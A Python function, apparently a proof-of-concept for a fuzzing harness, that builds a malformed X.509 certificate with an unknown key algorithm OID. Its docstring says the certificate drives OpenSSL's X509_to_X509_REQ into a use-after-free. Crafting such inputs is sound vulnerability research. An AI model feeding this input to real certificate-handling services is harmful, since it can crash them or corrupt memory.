def build() -> bytes:
    """
    Return a minimal DER‑encoded X509 certificate that parses successfully
    but contains an *unknown* public‑key algorithm OID.  When the harness
    calls ``X509_to_X509_REQ`` the call to ``X509_get0_pubkey(x)`` returns
    ``NULL`` → ``X509_REQ_set_pubkey`` fails → the function jumps to the
    ``err`` label, frees ``ret`` and returns ``NULL``.  The subsequent use‑after‑free
    is then caught by ASAN / canary checks.

    Only the Python standard library is used.
    """
    import struct

    # ---------------- ASN.1 helpers ----------------
    def _len(l: int) -> bytes:
        if l < 0x80:
            return struct.pack("B", l)
        b = l.to_bytes((l.bit_length() + 7) // 8, "big")
        return struct.pack("B", 0x80 | len(b)) + b

    def _tlv(tag: int, value: bytes) -> bytes:
        return struct.pack("B", tag) + _len(len(value)) + value

    def _int(v: int) -> bytes:
        if v == 0:
            enc = b"\x00"
        else:
            enc = v.to_bytes((v.bit_length() + 7) // 8, "big")
            if enc[0] & 0x80:          # ensure positive
                enc = b"\x00" + enc
        return _tlv(0x02, enc)

    def _oid(s: str) -> bytes:
        parts = [int(p) for p in s.split('.')]
        first = 40 * parts[0] + parts[1]
        rest = parts[2:]

        def enc_num(n: int) -> bytes:
            if n == 0:
                return b"\x00"
            out = bytearray()
            while n:
                out.insert(0, n & 0x7F)
                n >>= 7
            for i in range(len(out) - 1):
                out[i] |= 0x80
            return bytes(out)

        body = bytes([first]) + b"".join(enc_num(x) for x in rest)
        return _tlv(0x06, body)

    def _null() -> bytes:
        return b'\x05\x00'

    def _seq(content: bytes) -> bytes:
        return _tlv(0x30, content)

    def _set(content: bytes) -> bytes:
        return _tlv(0x31, content)

    def _bitstring(data: bytes) -> bytes:
        # 0 unused bits prefix
        return _tlv(0x03, b'\x00' + data)

    def _utctime(s: str) -> bytes:
        # s must be YYMMDDhhmmssZ (13 chars)
        return _tlv(0x17, s.encode())

    # ----------------- Fixed fields -----------------
    # version = v3 (value 2) wrapped in [0] EXPLICIT
    version = _tlv(0xA0, _int(2))

    serial = _int(1)

    # signatureAlgorithm (sha256WithRSAEncryption) – any known OID works
    sig_alg = _seq(_oid('1.2.840.113549.1.1.11') + _null())

    # empty issuer (SET of RDNs = empty)
    issuer = _seq(b'')

    # validity (notBefore, notAfter)
    not_before = _utctime('000101000000Z')   # 2000‑01‑01 00:00:00 UTC
    not_after  = _utctime('100101000000Z')   # 2010‑01‑01 00:00:00 UTC
    validity = _seq(not_before + not_after)

    # empty subject (SET of RDNs = empty)
    subject = _seq(b'')

    # SubjectPublicKeyInfo with an *unknown* algorithm OID (1.2.3.4.5)
    unknown_alg = _seq(_oid('1.2.3.4.5') + _null())
    empty_key   = _bitstring(b'')            # BIT STRING of length 0
    spki = _seq(unknown_alg + empty_key)

    # TBSCertificate (no extensions)
    tbs = _seq(
        version +
        serial +
        sig_alg +
        issuer +
        validity +
        subject +
        spki
    )

    # signatureValue – empty BIT STRING (parser does not validate it)
    signature = _bitstring(b'')

    # Full Certificate = SEQUENCE{ tbsCertificate, signatureAlgorithm, signature }
    cert = _seq(tbs + sig_alg + signature)

    return cert
